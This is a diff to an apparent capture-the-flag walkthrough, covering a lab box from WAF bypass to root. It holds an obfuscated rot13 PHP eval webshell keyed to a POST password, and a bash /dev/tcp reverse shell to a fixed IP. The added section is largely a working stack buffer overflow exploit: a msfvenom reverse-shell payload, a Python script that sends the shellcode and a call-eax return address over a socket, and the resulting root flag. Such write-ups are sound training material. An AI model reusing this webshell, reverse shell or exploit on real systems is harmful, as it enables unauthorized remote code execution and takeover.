@@ -131,8 +131,6 @@ Generate via AntSword again.
 <?php // 使用时请删除此行, 连接密码: NLRbeHys ?>
 <?php $jtch=create_function(str_rot13('$').chr(01212-01027).chr(0330272/01746).chr(01272-01115).chr(564-463),str_rot13('r').str_rot13('i').str_rot13('n').str_rot13('y').str_rot13('(').str_rot13('$').chr(546-431).chr(0x136-0xc7).str_rot13('z').str_rot13('r').str_rot13(')').str_rot13(';'));$jtch(str_rot13('517475;@riNy($_CBFG[AYEorUlf]);1552425;'));?>
 ```
-$someeval($some);
-517475;@evAl($_POST[NLRbeHys]);1552425;
 
 got: `Error: Invalid filetype (php)`. Let's try to change to `jpg`, then, got: `Error: CrappyWAF detected malware. Signature: Base64_decode php function detected`.
 `eval` function also get banned.
@@ -173,7 +171,7 @@ are affected by DirtyCoW. So this kernel just fixed this vulnerability.
 
 I think there might be something to dig, but I'm so lazy and tired. 
 
-bash -c 'bash -i &>/dev/tcp/192.168.1.68/9943 0<&1'
+Get a reverse shell: `bash -c 'bash -i &>/dev/tcp/192.168.1.68/9943 0<&1'`
 
 LinEnum first:
 
@@ -306,11 +304,80 @@ puts("Invalid Agent ID "Invalid Agent ID
 +++ exited (status 254) +++
 ```
 
-MSF created 500 bytes: 
+MSF created 500 bytes: `/opt/metasploit/tools/exploit/pattern_create.rb -l 500`
 
-gdb and use `3` to submit to get an buffer overflow: 0x41366641
+gdb `r` and use `3` to submit to get an buffer overflow: 0x41366641 (EIP)
 
-Found the buffer overflow at offset 168.
+`/opt/metasploit/tools/exploit/pattern_offset.rb -q 41366641 -l 500` Found the buffer overflow at offset 168.
 
-Now It's time to build the shellcode.
+Now It's time to build the shellcode, we have two methods here, first: ret2libc, second: ret2mycode.
 
+Due to `NO CANARY` and `NX Disabled`, we use method 2 here.
+
+Let's download this binary, and IDA-it. 
+
+With our lovely `snowman` plugin, just press `F3` to decompile the function we need. You'll find all your input was pointed with EAX.
+
+Get back to [ropshell](http://ropshell.com/ropsearch?h=fabc1afd43f668df0b812213567d032c) , you'll need to find a `call eax` at `0x08048563` to let program return back to the data we input.
+
+We use MSF here: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=29099 -f python -b "\x00\x0a\x0d"`  Generate a reverse shell in Python format and avoid null char or newline char.
+
+
+The payload should be generated in this way: 
+
+```
++======================+==========+
+|        Content       |  Length  |
++======================+==========+
+| \x90 (which mean nop)| 73 Bytes |
+|    PAYLOAD SHELL     | 95 Bytes | 
+|     RETURN ADDR      | 04 Bytes |
++======================+==========+
+```
+
+Just write a Python to help us:
+
+```python3
+#!/usr/bin/env python3
+
+import socket
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(("172.16.51.134", 7788))
+client.recv(512)
+client.sendall(b"48093572\n")
+client.recv(512)
+client.sendall(b"3\n")
+client.recv(512)
+
+# shellcode from msfvenom
+buf = b""
+buf += b"\xd9\xcd\xd9\x74\x24\xf4\xbe\x1d\xe3\x01\xd6\x5a\x29"
+buf += b"\xc9\xb1\x12\x31\x72\x17\x83\xea\xfc\x03\x6f\xf0\xe3"
+buf += b"\x23\xbe\x2d\x14\x28\x93\x92\x88\xc5\x11\x9c\xce\xaa"
+buf += b"\x73\x53\x90\x58\x22\xdb\xae\x93\x54\x52\xa8\xd2\x3c"
+buf += b"\xa5\xe2\x24\x8e\x4d\xf1\x26\x9f\x26\x7c\xc7\xef\x5f"
+buf += b"\x2f\x59\x5c\x13\xcc\xd0\x83\x9e\x53\xb0\x2b\x4f\x7b"
+buf += b"\x46\xc3\xe7\xac\x87\x71\x91\x3b\x34\x27\x32\xb5\x5a"
+buf += b"\x77\xbf\x08\x1c"
+
+# padding
+buf += b"A" * (168 - len(buf))
+
+# call eax gadget
+buf += b"\x63\x85\x04\x08\n"
+
+client.sendall(buf)
+client.close()
+```
+
+Then you have the root shell, the flag is under `/root/flag.txt`: flag6{R2gwc3RQcm90MGMwbHM=}
+
+Decode again: Gh0stProt0c0ls
+
+# Reference
+
+- http://ropshell.com
+- https://stackoverflow.com/questions/12167911/python-socket-send-ascii-command-and-receive-response
+
+(END)
